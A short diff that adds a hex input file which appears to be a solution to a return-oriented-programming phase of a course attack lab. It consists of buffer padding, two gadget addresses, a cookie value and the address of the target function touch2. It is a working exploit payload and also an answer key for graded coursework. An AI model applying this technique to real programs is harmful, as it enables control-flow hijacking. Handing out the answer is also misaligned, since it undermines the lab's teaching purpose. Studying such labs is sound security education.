@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 /* the addr of gadget1 */ /* popq %rax; nop; retq */
+fa 97 b9 59 00 00 00 00 /* the val of cookie */
+c6 19 40 00 00 00 00 00 /* the addr of gadget2 */ /* movl %eax,%edi; nop; retq */
+ec 17 40 00 00 00 00 00 /* the addr of touch2 */
